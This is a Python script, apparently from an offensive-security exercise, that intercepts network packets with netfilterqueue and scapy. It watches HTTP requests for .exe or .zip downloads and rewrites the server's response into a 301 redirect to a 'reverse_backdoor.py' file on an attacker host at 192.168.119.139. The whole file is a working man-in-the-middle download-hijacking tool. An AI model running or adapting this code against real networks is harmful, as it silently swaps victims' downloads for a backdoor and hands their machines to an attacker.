#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_packet(scapy_packet, new_load: bytes):
    if scapy_packet.haslayer(scapy.Raw):
        scapy_packet[scapy.Raw].load = new_load
    else:
        scapy_packet = scapy_packet / scapy.Raw(new_load)
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    if scapy_packet.haslayer(scapy.TCP):
        del scapy_packet[scapy.TCP].chksum
    return scapy_packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if not scapy_packet.haslayer(scapy.TCP):
        print("[*] Packet does not have a TCP layer")
        packet.accept()
        return
    tcp_layer = scapy_packet[scapy.TCP]
    if scapy_packet.haslayer(scapy.Raw):
        raw_load = scapy_packet[scapy.Raw].load
        try:
            load_str = raw_load.decode("utf-8", errors="ignore")
        except Exception as e:
            load_str = str(raw_load)
        print(f"TCP Src: {tcp_layer.sport} Dst: {tcp_layer.dport}")
        print("HTTP Payload:")
        print(load_str)
        if tcp_layer.dport in [80, 8080]:
            print("[+] Outgoing HTTP request detected.")
            if (".exe" in load_str or ".zip" in load_str) and "192.168.119.139" not in load_str:
                print("[+] File request found; saving ACK:", tcp_layer.ack)
                ack_list.append(tcp_layer.ack)
        elif tcp_layer.sport in [80, 8080]:
            if tcp_layer.seq in ack_list:
                ack_list.remove(tcp_layer.seq)
                print("[+] Matching HTTP response found. Redirecting file download...")
                redirect_payload = (
                    b"HTTP/1.1 301 Moved Permanently\r\n"
                    b"Location: http://192.168.119.139/evilfiles/reverse_backdoor.py\r\n"
                    b"\r\n"
                )
                modified_packet = set_packet(scapy_packet, redirect_payload)
                packet.set_payload(bytes(modified_packet))
                print(modified_packet.show())
        else:
            print("[+] No Packet matches filter...")
    else:
        print("[*] Packet does not have a Raw layer")
    packet.accept()

def main():
    print("[*] Starting file interceptor...")
    queue = netfilterqueue.NetfilterQueue()
    try:
        queue.bind(0, process_packet)
        print("[*] Bound to netfilter queue 0. Waiting for data...")
        queue.run()
    except KeyboardInterrupt:
        print("\n[*] Detected Ctrl+C... Exiting.")
    except Exception as e:
        print("[!] Error:", e)
    finally:
        queue.unbind()

if __name__ == "__main__":
    main()